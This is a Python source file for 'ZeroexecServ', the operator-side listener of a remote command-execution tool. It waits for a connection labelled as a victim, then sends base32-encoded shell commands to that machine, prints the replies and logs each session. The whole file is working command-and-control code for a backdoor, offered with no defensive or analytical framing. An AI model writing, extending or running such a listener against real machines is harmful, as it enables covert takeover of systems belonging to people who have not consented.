import socket
import base64
import io
from datetime import datetime
from .custom_banner import tagline

class ZeroexecServ:

    def __init__(self):
        self.__ctime=datetime.now().strftime("%H:%M")
        self.__cyear=datetime.now().strftime("%Y:%m:%d")
        print(tagline())

    def capture_victim(self, host: str, port: int):
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((host, port))
            s.listen(1)
            print(f"<[INITIATE]: LISTEN ON {host}>")
            conn, addr = s.accept()
            print("<[COMPLETE]: INITIALIZED OK>")
            return (conn, addr)

    def rce_connection(self, options, host: str, port: int):
        try:
            sessions=[]
            conn, addr = self.capture_victim(host, port)
            sessions.append(addr)
            while True:
                self.cmd=input("\nZEROEXEC~$ ").strip()
                conn.send(base64.b32hexencode(self.cmd.encode()))
                recvdata = conn.recv(1024*10).decode() 
                print(recvdata)
                if options.write_logs:
                    self.write_logs(
                        recvdata,
                        self.__ctime,
                        self.__cyear
                    )
                if self.cmd in ["quit", "exit"]:
                    if options.write_logs:
                        print(f"[INFO]: File saved - {self.filename}")
                    conn.close()
                    break
            conn.close()
        except KeyboardInterrupt:
            print("[INFO]: RCE is stopped.")
        except OSError:
            print("[INFO]: Unexpectedly connection lost.")


    def write_logs(self, data: str, time: str, year: str):
        self.filename=f"./sessionlogs/trace-{time}#{year}.log"
        logfile=io.open(self.filename, "a+")
        logtext=f"Command: {self.cmd}\n{data}\n\n"
        logfile.write(logtext)
